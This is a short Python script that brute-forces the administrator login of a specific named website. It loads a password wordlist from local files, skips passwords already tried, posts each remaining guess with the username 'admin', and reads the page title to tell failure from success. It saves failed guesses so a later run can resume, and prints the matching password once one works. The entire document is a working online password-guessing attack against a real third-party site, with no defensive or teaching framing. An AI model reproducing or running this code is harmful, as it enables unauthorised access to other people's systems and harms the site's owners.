import requests
import re

pwds_f = open('C:\\Users\\-\\Desktop\\pwd.txt', encoding='utf8')
pwds = pwds_f.read().split('\n')
pwds_f.close()
npwds_f = open('C:\\Users\\-\\Desktop\\n_pwd.txt', encoding='utf8')
npwds = npwds_f.read().split('\n')
print(len(npwds))
for npwd in npwds:
        if npwd in pwds:
                pwds.remove(npwd)
print(len(pwds))
name = 'admin'
i = 0
not_pass_list = []
for pwd in pwds:
        i += 1
        data = {'loginname': name,
                'loginpwd': pwd}
        response = requests.post('http://www.cnsoftbei.com/admin/', timeout=30,
                                 data=data)
        content = response.text
        result = re.findall('<title>(.*?)</title>', content, re.S)
        if len(result) != 0:
                if result[0] == '(错误提示)后台管理':
                        if pwd not in not_pass_list:
                                not_pass_list.append(pwd)
                        if i % 100 == 0:
                                n_pwd_f = open('C:\\Users\\-\\Desktop\\n_pwd.txt',
                                               encoding='utf8', mode='a')
                                for n_pwd in not_pass_list:
                                        n_pwd_f.write(n_pwd + '\n')
                                n_pwd_f.close()
                        print(str(i) + '. (错误提示)后台管理')
                else:
                        if pwd == '0' or pwd.strip() == '':
                                continue
                        print(str(i) + '. pwd: ' + pwd)
                        print(content)
                        break
        else:
                print('找不到title')
        print('\n')
